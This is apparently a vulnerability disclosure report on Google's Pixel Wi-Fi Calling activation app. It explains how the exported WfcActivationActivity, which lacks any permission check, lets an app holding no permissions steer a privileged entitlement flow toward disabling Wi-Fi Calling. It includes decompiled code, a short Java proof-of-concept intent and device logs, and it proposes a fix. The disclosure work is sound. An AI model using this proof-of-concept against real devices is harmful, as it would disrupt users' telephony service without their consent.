# com.google.android.wfcactivation — `WfcActivationActivity` Missing Permission Enforcement Allows Zero-Permission Apps to Drive Privileged Carrier WFC/Entitlement Flow

## Summary

`com.google.android.wfcactivation` is Google's own Pixel carrier Wi-Fi-Calling activation/entitlement app. It is significantly more privileged than the AOSP `com.android.imsserviceentitlement` equivalent (a **separate, related finding** already reported as `VRP_SUBMISSION_WFC_ACTIVATION_MISSING_PERM`): it holds `android.permission.MODIFY_PHONE_STATE`, `WRITE_APN_SETTINGS`, `WRITE_SETTINGS`, and `READ_PRIVILEGED_PHONE_STATE` in its own manifest.

Its main entry point, `WfcActivationActivity`, is exported with **no permission at all** (and even has a `MAIN`/`DEFAULT` intent-filter). It builds its entire entitlement/telephony-state-mutation flow directly from caller-supplied `Intent` extras (`android.telephony.extra.SUBSCRIPTION_INDEX`, `EXTRA_LAUNCH_CARRIER_APP`) with no caller-identity check of any kind. The underlying state machine (`EntitlementStatusViewModel.handleInitialEntitlementStatus()`) can call `ImsUtils.disableAndResetVoWiFiImsSettings()` → `ImsMmTelManager.setVoWiFiSettingEnabled(false)`, disabling the user's Wi-Fi Calling — the exact same privileged-sink pattern already confirmed and reported in the AOSP app, but here reachable through a component belonging to a package with an even larger privileged-permission set.

This is the same underlying architectural bug class (unauthenticated caller-controlled intent extras driving a privileged carrier-entitlement state machine) independently present in a second, unrelated APK — reported separately because it is a distinct binary/package that needs its own fix.

## Severity: MEDIUM (Integrity / Availability — telephony/IMS state)

- **Attack vector**: Local (malicious zero-permission app installed on device)
- **Permissions required**: ZERO
- **User interaction**: None
- **CIA impact**: Integrity/Availability — a zero-permission app can force a privileged, `MODIFY_PHONE_STATE`-holding system app into the foreground and drive its entitlement state machine for an attacker-chosen subscription ID. Per code trace, this machine is capable of programmatically disabling Wi-Fi Calling (`ImsMmTelManager.setVoWiFiSettingEnabled(false)`) and resetting VoWiFi mode/roaming-mode carrier settings with zero permissions.

## Affected Component

- **Package**: `com.google.android.wfcactivation` (priv-app, `/product/priv-app/WfcActivation/WfcActivation.apk`), versionCode 104
- **Declares** (among others): `android.permission.MODIFY_PHONE_STATE`, `android.permission.WRITE_APN_SETTINGS`, `android.permission.WRITE_SETTINGS`, `android.permission.READ_PRIVILEGED_PHONE_STATE`
- **Activity**: `com.google.android.wfcactivation.WfcActivationActivity`

```
E: activity (line=76)
    A: android:theme=@0x7f1102b9
    A: android:name="com.google.android.wfcactivation.WfcActivationActivity"
    A: android:exported=true
    A: android:configChanges=0x00000490
    (no android:permission attribute)
      E: intent-filter
          E: action android:name="android.intent.action.MAIN"
          E: category android:name="android.intent.category.DEFAULT"
```

For contrast, the sibling entry points into the same package correctly require a permission — e.g. `VzwVoWiFiReceiver` (also drives VoWiFi/MDN state) requires `android.permission.MODIFY_PHONE_STATE`, and the carrier-specific activity-aliases (`VzwEmergencyAddressActivity`, `WfcActivationCanadaActivity`, `DishWfcActivationActivity`) all require the signature-level `android.permission.CONNECTIVITY_INTERNAL`. `WfcActivationActivity` — the generic, carrier-agnostic entry point — is the one exception with no check.

## Root Cause

`WfcActivationActivity.onCreate()` pulls `subId` from `FocusRingDrawableIA.getSubId(getIntent())` and the `startIntent` used for later branching is simply `getIntent()` — both entirely attacker-controlled, with no permission or caller-identity check anywhere in the method:

```java
// com/google/android/material/focus/FocusRingDrawableIA.java
public static int getSubId(Intent intent) {
    if (intent == null) return SubscriptionManager.getDefaultDataSubscriptionId();
    return intent.getIntExtra("android.telephony.extra.SUBSCRIPTION_INDEX",
                               SubscriptionManager.getDefaultDataSubscriptionId());
}
public static int getLaunchIntention(Intent intent) {
    if (intent == null) return 0;
    return intent.getIntExtra("EXTRA_LAUNCH_CARRIER_APP", 0);
}
public static boolean isActivationFlow(Intent intent) {
    int launchIntention = getLaunchIntention(intent);
    return launchIntention == 0 || launchIntention == 3;
}
```

`EntitlementStatusViewModel.handleInitialEntitlementStatus()` — reached via `onCreate()` → `EntitlementUtils.entitlementCheck()` — branches on `isActivationFlow` (fully attacker-controlled) and, for the non-activation ("updating"/e911) branch, reaches the privileged sink whenever the (real, network-fetched) entitlement status comes back `inactive()` or `incompatible()`:

```java
// EntitlementStatusViewModel.java
public final void handleInitialEntitlementStatus(EntitlementResult entitlementResult) {
    ...
    if (!this.isActivationFlow) {
        VowifiStatus vowifiStatus = entitlementResult.vowifiStatus;
        if (vowifiStatus.vowifiEntitled()) { ... return; }
        if (vowifiStatus.inactive()) {
            uiStateLiveData.setValue(UiState.ENTITLEMENT_FAILURE);
            turnOffWfc(...);                      // <-- privileged sink
            return;
        } else if (vowifiStatus.incompatible()) {
            uiStateLiveData.setValue(UiState.ENTITLEMENT_FAILURE);
            turnOffWfc(...);                      // <-- privileged sink
            return;
        }
        ...
    }
}

public final void turnOffWfc(Runnable r) {
    new AsyncTask() {
        protected Object doInBackground(Object[] o) {
            ImsUtils.this.disableAndResetVoWiFiImsSettings();
            return null;
        }
        ...
    }.execute();
}
```

```java
// com/google/android/wfcactivation/utils/ImsUtils.java
public final void disableAndResetVoWiFiImsSettings() {
    try {
        setWfcSetting(false, false);   // -> imsMmTelManager.setVoWiFiSettingEnabled(false)
        PersistableBundle configForSubId = carrierConfigManager.getConfigForSubId(subId);
        if (configForSubId != null) {
            imsMmTelManager.setVoWiFiModeSetting(configForSubId.getInt("carrier_default_wfc_ims_mode_int"));
            imsMmTelManager.setVoWiFiRoamingModeSetting(configForSubId.getInt("carrier_default_wfc_ims_roaming_mode_int"));
        }
    } catch (RuntimeException unused) {}
}

public final void setWfcSetting(boolean z, boolean z2) {
    ...
    imsMmTelManager.setVoWiFiSettingEnabled(z);
}
```

`ImsMmTelManager.setVoWiFiSettingEnabled()` is a privileged telephony API — it executes here with `com.google.android.wfcactivation`'s own held permissions, regardless of what the *caller who launched the activity* holds. Because `WfcActivationActivity` performs no permission check, any zero-permission app can reach this sink for an attacker-chosen `subId` by simply supplying `EXTRA_LAUNCH_CARRIER_APP` set to any value other than `0`/`3` (routing into the non-activation/e911 branch above) and waiting for the real entitlement network check to resolve to `inactive()`/`incompatible()`.

## Proof of Concept

Reusing the same zero-permission PoC app (`com.vrp.zeroperm`, no `<uses-permission>` declared at all) used for the related AOSP finding, extended to also target this package:

```java
Intent i = new Intent();
i.setComponent(new ComponentName("com.google.android.wfcactivation",
        "com.google.android.wfcactivation.WfcActivationActivity"));
i.putExtra("android.telephony.extra.SUBSCRIPTION_INDEX", 1);   // attacker-chosen subId
i.putExtra("EXTRA_LAUNCH_CARRIER_APP", 1);                     // routes into the e911/"updating" flow
i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(i);   // succeeds, no SecurityException
```

### Dynamic result (Pixel 6a, Android 17 Beta / API 37, September 2026)

```
09-29 12:07:48.456  4936  4936 I VRP-WfcProbe: WfcActivationActivity: startActivity() returned normally (no SecurityException) subId=1
09-29 12:07:48.462  1505  2348 I ActivityTaskManager: START u0 {cmp=com.google.android.wfcactivation/.WfcActivationActivity (has extras)} with LAUNCH_MULTIPLE from uid 10397 (com.vrp.zeroperm) (BAL_ALLOW_VISIBLE_WINDOW) result code=0
09-29 12:07:48.616  1505  1582 I ActivityTaskManager: Displayed com.google.android.wfcactivation/.WfcActivationActivity for user 0: +156ms
```

The zero-permission caller's `startActivity()` succeeds cleanly with no `Permission Denial`, and the OS log confirms the real system app's UI was genuinely **displayed to the user** (`Displayed ... +156ms`). The screenshot below shows the actual app UI now in the foreground, driven by the attacker-supplied `EXTRA_LAUNCH_CARRIER_APP=1` extra (mapping to the e911/address-update error branch — the identical string resource and code branch already confirmed for the sibling AOSP app):

![Emergency Location Information UI forced into the foreground by a zero-permission app](screenshot_emergency_address_ui.png)

### Limitation honestly disclosed

As with the related AOSP finding, the test device has no SIM inserted, so the real TS.43-style entitlement network round-trip cannot complete against a live carrier server, and this specific run's `entitlementResult` did not resolve to `inactive()`/`incompatible()` — the final `ImsMmTelManager.setVoWiFiSettingEnabled(false)` call was not observed firing on this hardware. The missing-permission-enforcement vulnerability itself — a zero-permission app forcing this privileged, `MODIFY_PHONE_STATE`-holding system activity into the foreground and steering its execution via unauthenticated intent extras — is fully and dynamically proven independent of that last network-dependent step, and the code path to the sink is unambiguous (shown above, mirroring the pattern already found in the sibling AOSP app).

## Suggested Fix

Add an appropriate permission check to `WfcActivationActivity` (e.g. `android.permission.MODIFY_PHONE_STATE`, matching what the activity-aliases and `VzwVoWiFiReceiver` in the same package already require), or verify `getCallingPackage()`/`getLaunchedFromPackage()` against a known-trusted caller (Settings, Phone/Dialer, or the telephony framework) before invoking any entitlement/state-mutation logic.

## Environment

- **Device**: Pixel 6a
- **OS**: Android 17 Beta (API 37), security patch 2026-07-05
- **Target package**: `com.google.android.wfcactivation`, versionCode 104 (priv-app)
- **Tested**: September 2026

## Related

This is a **separate binary** but the **same architectural bug class** already reported in `com.android.imsserviceentitlement` (`VRP_SUBMISSION_WFC_ACTIVATION_MISSING_PERM/`), where `WfcActivationActivity`'s sibling `WfcQnsActivationActivity` correctly requires `MODIFY_PHONE_STATE`. Both packages appear to derive from the same original TS.43 entitlement codebase; the missing check was evidently not propagated (or was lost) on the generic/default entry activity in both forks. A shared upstream fix (or code review of any other forks of this codebase, e.g. `com.google.android.wfcactivation.can.WfcActivationCanadaActivity`'s package siblings) is recommended.
